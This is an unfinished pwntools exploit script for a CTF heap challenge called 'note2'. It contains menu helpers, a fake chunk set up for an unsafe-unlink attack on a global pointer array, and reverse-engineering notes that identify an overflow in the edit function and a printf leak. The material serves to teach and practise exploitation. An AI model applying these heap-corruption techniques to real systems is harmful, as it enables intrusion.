#!/usr/bin/env python3

from pwn import *

exe = ELF("./note2")
libc = ELF("./libc-2.19.so")
ld = ELF("./ld-2.19.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def new(size, data):
    	r.sendline("1")
    	r.sendline(str(size))
    	r.send(data)

    def show(idx):
    	r.sendline("2")
    	r.sendline(str(idx))

    def edit(idx, choice, data):
    	r.sendline("3")
    	r.sendline(str(idx))
    	r.sendline(str(choice)) # 1. overwrite ; 2. append
    	r.send(data)

    def delete(idx):
    	r.sendline("4")
    	r.sendline(str(idx))

    # input name and addr
    r.sendline("deadbeef")
    r.sendline("0x1337 Av.")

    # overwrite stored ptr

    fake_chunk = ""
    fake_chunk += p64(0) # prev_size
    fake_chunk += p64(0x81) # size
    fake_chunk += p64(0x602128 - 0x18) # fd
    fake_chunk += p64(0x602128 - 0x10) # bk

    new(0x80, "A" * 0x7f) # 0
    new(0x80, "B" * 0x7f) # 1

    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
no pie
ask for our name and address, stores them in global variables
readDelim puts NULL char
globar variable count - 0x0602160
pointer storage - 0x0602120 + idx*8
size storage - 0x0602140 + idx*8

pointer 
new:
	- 4 allocs
	- asks size < 0x81 (accounting null char)
	- message may indicate off by one vuln?
	- weird function that modifies our inputted string and - can put null character somewhere else and can shift characters?

show:
	- makes sure index is -1 < idx < 4 && pointer exists in storage
	- printf - leak

edit:
	- asks for id, is in bounds
	- checks if pointer still exists in storage
	- choose to overwrite(1) or append(2)
	if choice == overwrite
		- local_100[0] = '\0'
	else
		strcpy(local_100, *ptr)
	- malloc(0xa0), stores ptr in local variable
	- [0]-[1] TheNewContents:
	- readDelim continuing +0xf
	- calls weirdFun on that string
	- puts a null byte somewhere
	- concatenates and copies over back to ptr
	- frees that chunk
	- vulnerable to overflow - lookout for nullbytes!

delete:
	- checks if pointer still exists and idx is in bounds
	- clears ptr and size

'''
